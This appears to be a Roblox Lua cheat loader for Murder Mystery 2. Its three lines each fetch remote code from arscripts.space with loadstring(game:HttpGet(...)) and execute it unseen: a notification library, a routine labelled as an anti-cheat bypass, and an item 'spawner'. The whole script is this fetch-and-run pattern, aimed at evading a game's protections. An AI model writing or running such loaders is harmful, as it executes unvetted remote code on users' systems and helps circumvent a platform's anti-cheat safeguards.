local AkaliNotif = loadstring(game:HttpGet("https://arscripts.space/nsNotify/Notifyns.lua"))();
local Notify = AkaliNotif.Notify;

wait(1);
local function BypassAntiCheat()
        loadstring(game:HttpGet("https://arscripts.space/AAMM2SCRIPT"))()
end
local function MM2Spawner()
        loadstring(game:HttpGet("https://arscripts.space/mm2spawnerscripts", true))()
end
task.spawn(BypassAntiCheat)
task.spawn(MM2Spawner)
